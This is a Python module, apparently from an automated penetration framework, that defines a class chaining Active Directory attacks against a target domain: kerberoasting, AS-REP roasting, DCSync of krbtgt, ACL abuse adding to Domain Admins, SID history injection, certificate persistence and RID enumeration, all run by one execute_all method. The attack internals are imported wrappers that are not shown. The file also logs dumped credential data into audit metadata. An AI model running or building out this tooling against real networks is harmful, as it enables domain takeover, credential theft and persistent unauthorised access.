import logging
from typing import Dict, List, Optional

from autopwn_core.shared.attack_context import AttackContext
from autopwn_core.shared.exec_wrappers import (
    execute_kerberoast,
    execute_asreproast,
    perform_dcsync,
    perform_acl_abuse,
    abuse_unconstrained_delegation,
    abuse_sid_history,
    execute_cert_persistence,
    enumerate_rid_cycles,
)
from autopwn_core.shared.audit_logger import log_action
from autopwn_core.shared.tactics_mapping import TacticTag

logger = logging.getLogger("ad_attacks")

class ADAttackExecutor:
    def __init__(self, ctx: AttackContext):
        self.ctx = ctx
        self.session_id = ctx.session_id
        self.target = ctx.target_host
        self.username = ctx.username
        self.password = ctx.password
        self.domain = ctx.domain

    def _log_attack(self, technique: str, status: str, metadata: Optional[Dict] = None):
        log_action(
            actor="autopwn-ad",
            action=technique,
            status=status,
            resource=self.target,
            metadata={
                "session_id": self.session_id,
                "username": self.username,
                "domain": self.domain,
                "technique": technique,
                **(metadata or {})
            },
            tags=[TacticTag.CREDENTIAL_ACCESS, TacticTag.PRIVILEGE_ESCALATION]
        )

    def run_kerberoast(self) -> bool:
        success, data = execute_kerberoast(self.domain, self.username, self.password)
        self._log_attack("kerberoasting", "success" if success else "fail", {"result": data})
        return success

    def run_asrep_roast(self) -> bool:
        success, data = execute_asreproast(self.domain)
        self._log_attack("asreproast", "success" if success else "fail", {"result": data})
        return success

    def run_dcsync(self, target_user: str = "krbtgt") -> bool:
        success, data = perform_dcsync(self.domain, target_user)
        self._log_attack("dcsync", "success" if success else "fail", {"target_user": target_user, "dump": data})
        return success

    def abuse_acl(self, target_user: str, action: str = "add-member") -> bool:
        success, result = perform_acl_abuse(self.domain, target_user, action)
        self._log_attack("acl_abuse", "success" if success else "fail", {"action": action, "target": target_user})
        return success

    def abuse_unconstrained_deleg(self) -> bool:
        success, result = abuse_unconstrained_delegation(self.domain, self.username)
        self._log_attack("unconstrained_delegation", "success" if success else "fail", {"result": result})
        return success

    def inject_sid_history(self, from_user: str, to_user: str) -> bool:
        success, result = abuse_sid_history(self.domain, from_user, to_user)
        self._log_attack("sid_history_injection", "success" if success else "fail", {"from": from_user, "to": to_user})
        return success

    def run_cert_persistence(self, template: str = "User") -> bool:
        success, result = execute_cert_persistence(self.domain, self.username, template)
        self._log_attack("cert_persistence", "success" if success else "fail", {"template": template})
        return success

    def enumerate_rid_hijack(self) -> bool:
        success, data = enumerate_rid_cycles(self.domain)
        self._log_attack("rid_hijack_enum", "success" if success else "fail", {"cycles": data})
        return success

    def execute_all(self) -> Dict[str, bool]:
        results = {
            "kerberoasting": self.run_kerberoast(),
            "asreproast": self.run_asrep_roast(),
            "dcsync": self.run_dcsync(),
            "acl_abuse": self.abuse_acl(target_user="Domain Admins"),
            "unconstrained_delegation": self.abuse_unconstrained_deleg(),
            "sid_history": self.inject_sid_history("user1", "user2"),
            "cert_persistence": self.run_cert_persistence(),
            "rid_hijack_enum": self.enumerate_rid_hijack()
        }
        return results
